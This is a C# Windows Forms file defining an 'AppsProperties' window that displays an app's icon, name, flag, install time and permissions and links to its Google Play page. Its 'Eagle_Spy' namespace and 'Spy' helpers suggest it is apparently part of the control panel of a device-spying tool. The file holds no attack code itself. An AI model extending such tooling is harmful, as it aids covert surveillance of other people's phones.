using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class AppsProperties : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BoxIcons")]
	private PictureBox _BoxIcons;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private Timer _TOpacity;

	public string Title;

	internal PictureBox BoxIcons
;

	[field: AccessedThroughProperty("BOXPNL1")]
	internal Panel BOXPNL1
    ;

    [field: AccessedThroughProperty("LAppInstallTime")]
	internal Label LAppInstallTime
    ;

    [field: AccessedThroughProperty("LAppFlag")]
	internal Label LAppFlag
    ;

    [field: AccessedThroughProperty("LAppName")]
	internal Label LAppName
    ;

	internal Timer TOpacity
	;

	[field: AccessedThroughProperty("LPermissions")]
	internal Label LPermissions
	;

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            this.BoxIcons = new System.Windows.Forms.PictureBox();
            this.BOXPNL1 = new System.Windows.Forms.Panel();
            this.LPermissions = new System.Windows.Forms.Label();
            this.LAppInstallTime = new System.Windows.Forms.Label();
            this.LAppFlag = new System.Windows.Forms.Label();
            this.LAppName = new System.Windows.Forms.Label();
            this.TOpacity = new System.Windows.Forms.Timer(this.components);
            ((System.ComponentModel.ISupportInitialize)(this.BoxIcons)).BeginInit();
            this.BOXPNL1.SuspendLayout();
            this.SuspendLayout();
            // 
            // BoxIcons
            // 
            this.BoxIcons.Cursor = System.Windows.Forms.Cursors.Hand;
            this.BoxIcons.Dock = System.Windows.Forms.DockStyle.Top;
            this.BoxIcons.Location = new System.Drawing.Point(0, 0);
            this.BoxIcons.Name = "BoxIcons";
            this.BoxIcons.Size = new System.Drawing.Size(335, 196);
            this.BoxIcons.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage;
            this.BoxIcons.TabIndex = 0;
            this.BoxIcons.TabStop = false;
            this.BoxIcons.Click += new System.EventHandler(this.BoxIcons_Click);
            // 
            // BOXPNL1
            // 
            this.BOXPNL1.AutoScroll = true;
            this.BOXPNL1.BackColor = System.Drawing.Color.Black;
            this.BOXPNL1.Controls.Add(this.LPermissions);
            this.BOXPNL1.Controls.Add(this.LAppInstallTime);
            this.BOXPNL1.Controls.Add(this.LAppFlag);
            this.BOXPNL1.Controls.Add(this.LAppName);
            this.BOXPNL1.Controls.Add(this.BoxIcons);
            this.BOXPNL1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.BOXPNL1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(190)))), ((int)(((byte)(190)))), ((int)(((byte)(190)))));
            this.BOXPNL1.Location = new System.Drawing.Point(0, 0);
            this.BOXPNL1.Name = "BOXPNL1";
            this.BOXPNL1.Size = new System.Drawing.Size(335, 474);
            this.BOXPNL1.TabIndex = 1;
            // 
            // LPermissions
            // 
            this.LPermissions.Dock = System.Windows.Forms.DockStyle.Top;
            this.LPermissions.Location = new System.Drawing.Point(0, 307);
            this.LPermissions.Name = "LPermissions";
            this.LPermissions.Size = new System.Drawing.Size(335, 37);
            this.LPermissions.TabIndex = 5;
            this.LPermissions.Text = "Permissions";
            this.LPermissions.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // LAppInstallTime
            // 
            this.LAppInstallTime.Dock = System.Windows.Forms.DockStyle.Top;
            this.LAppInstallTime.Location = new System.Drawing.Point(0, 270);
            this.LAppInstallTime.Name = "LAppInstallTime";
            this.LAppInstallTime.Size = new System.Drawing.Size(335, 37);
            this.LAppInstallTime.TabIndex = 3;
            this.LAppInstallTime.Text = "installTime ";
            this.LAppInstallTime.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // LAppFlag
            // 
            this.LAppFlag.Dock = System.Windows.Forms.DockStyle.Top;
            this.LAppFlag.Location = new System.Drawing.Point(0, 233);
            this.LAppFlag.Name = "LAppFlag";
            this.LAppFlag.Size = new System.Drawing.Size(335, 37);
            this.LAppFlag.TabIndex = 2;
            this.LAppFlag.Text = "flag";
            this.LAppFlag.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // LAppName
            // 
            this.LAppName.Dock = System.Windows.Forms.DockStyle.Top;
            this.LAppName.Location = new System.Drawing.Point(0, 196);
            this.LAppName.Name = "LAppName";
            this.LAppName.Size = new System.Drawing.Size(335, 37);
            this.LAppName.TabIndex = 1;
            this.LAppName.Text = "AppName";
            this.LAppName.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // TOpacity
            // 
            this.TOpacity.Interval = 1;
            this.TOpacity.Tick += new System.EventHandler(this.TOpacity_Tick);
            // 
            // AppsProperties
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(335, 474);
            this.Controls.Add(this.BOXPNL1);
            this.Name = "AppsProperties";
            this.Opacity = 0D;
            this.Text = "Properties";
            ((System.ComponentModel.ISupportInitialize)(this.BoxIcons)).EndInit();
            this.BOXPNL1.ResumeLayout(false);
            this.ResumeLayout(false);

	}

	public AppsProperties()
	{
		base.Load += AppsProperties_Load;
		Title = "null";
		InitializeComponent();
		Font = reso.f;
	}

	private void AppsProperties_Load(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\2.ico");
		SpyStyle();
		Text = Title;
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
	}

	private void SpyStyle()
	{
		foreach (Panel item in base.Controls.OfType<Panel>())
		{
			item.BackColor = Color.Black;
        }
		foreach (Label item2 in BOXPNL1.Controls.OfType<Label>())
		{
			item2.ForeColor = Color.White;
            item2.BackColor = Color.Black;
		}
		foreach (PictureBox item3 in BOXPNL1.Controls.OfType<PictureBox>())
		{
			item3.BackColor = Color.Black;
        }
		LPermissions.ForeColor = Color.White;
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
			base.Opacity += 0.1;
		else
			TOpacity.Enabled = false;
	}

	private void BoxIcons_Click(object sender, EventArgs e)
	{
		Process.Start(string.Format("{0}{1}", "https://play.google.com/store/apps/details?id=", Conversions.ToString(BoxIcons.Tag)));
	}
}
